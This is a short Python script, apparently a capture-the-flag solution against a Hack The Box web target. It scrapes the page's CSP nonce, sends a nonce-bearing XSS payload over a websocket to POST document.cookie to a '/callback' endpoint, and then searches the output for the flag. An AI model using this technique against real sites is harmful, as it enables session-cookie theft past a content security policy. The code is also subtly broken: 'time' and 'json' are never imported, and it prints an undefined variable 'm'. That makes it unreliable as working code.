import requests
import sys
import subprocess
import re


ip=sys.argv[1]
p=subprocess.Popen(['wscat','-c',f'ws://{ip}/ws'],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True)
time.sleep(1)
r=requests.get(f'http://{ip}/')
n=re.search(r"script-src 'self' 'nonce-([0-9a-f]+)'",r.headers['content-security-policy']).group(1)
msg=json.dumps({"type":"trigger_xss","payload":f'<script nonce="{n}">\n   fetch(\'/callback\',{{method:\'POST\',headers:{{\'Content-Type\':\'application/json\'}},body:JSON.stringify({{cookies:document.cookie}})}});\n</script>'})
p.stdin.write(msg+"\n");p.stdin.flush()
for flag in p.stdout:
    get_flag=re.search(r"HTB\{[^}]+\}",flag)
    if get_flag:
        print(m.group())
        break
